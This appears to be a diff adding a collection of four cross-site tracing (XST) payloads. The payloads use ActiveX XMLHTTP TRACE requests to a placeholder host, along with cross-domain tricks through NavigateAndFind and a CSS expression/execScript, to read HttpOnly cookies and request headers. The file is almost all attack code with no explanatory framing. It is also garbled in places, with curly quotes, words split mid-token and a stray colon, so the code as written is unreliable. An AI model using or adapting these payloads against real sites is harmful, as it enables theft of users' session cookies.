@@ -1,0 +1,60 @@
+httponly_XST Payload =>1
+
+<script type=”text/javascript”> 
+<!-- 
+function normalCookie() {    
+	document.cookie = “TheCookieName=CookieValue_httpOnly”;    
+	alert(document.cookie); 
+}
+function httpOnlyCookie() {    
+	document.cookie = “TheCookieName=CookieValue_httpOnly; httpOnly”;    
+	alert(document.cookie);
+}
+//--> 
+</script>
+<FORM> 
+<INPUT TYPE=BUTTON OnClick=”normalCookie();” VALUE=’Display Normal Cookie’> 
+<INPUT TYPE=BUTTON OnClick=”httpOnlyCookie();” VALUE=’Display HTTPONLY Cookie’> 
+</FORM> 
+
+
+httponly_XST Payload =>2
+
+<script type=”text/javascript”> 
+<!-- function sendTrace () {    
+var xmlHttp = new ActiveXObject(“Microsoft.XMLHTTP”);    
+xmlHttp.open(“TRACE”, “http://foo.bar”,false);    
+xmlHttp.send();    
+xmlDoc=xmlHttp.responseText;    
+alert(xmlDoc); } 
+//--> 
+</script>
+<INPUT TYPE=BUTTON OnClick=”sendTrace();” VALUE=”Send Trace Request”>
+
+Payload =>3
+
+<script type=”text/javascript”> 
+<!-- function xssDomain()  { 
+	var oWin=open(“blank.html”,”victim”,”width=500,height=400”);
+	var oVuln=oWin.external;
+	oWin.location.href=”http://foo.bar”;
+	setTimeout(
+		function () {
+			oVuln.NavigateAndFind(‘javascript:xmlHttp=new ActiveXOb ject(“Microsoft.XMLHTTP”);xmlHttp.open(“TRACE”,”http://foo.bar”,false);xmlH ttp.send();xmlDoc=xmlHttp.responseText;alert(“Show all headers for foo.com including cookie without using document.cookie \\n” + xmlDoc);’,””,””);
+			},
+			2000
+		):
+
+}
+//--> </script>
+<INPUT TYPE=BUTTON OnClick=”xssDomain();” VALUE=’TRACE XSS Domain’> 
+
+Payload =>4
+
+<script type=”text/javascript”> function xssDomainTraceRequest(){ 
+var exampleCode = “var xmlHttp = new ActiveXObject(\ ”Microsoft.XMLHTTP\”)\;xmlHttp.open(\”TRACE\”,\”http://foo.bar\”,false)\ ;xmlHttp.send()\;xmlDoc=xmlHttp.responseText\;alert(xmlDoc)\;”;
+var target = “http://foo.bar”; cExampleCode = encodeURIComponent(exampleCode  + ‘;top.close()’); var readyCode = ‘font-size:expression(execScript(decodeURIComponen t(“’ + cExampleCode + ‘”)))’; showModalDialog(target, null, readyCode); }
+</script>
+<INPUT TYPE=BUTTON OnClick=”xssDomainTraceRequest()” VALUE=”Show Cookie Information Using TRACE”> 
+
+ 
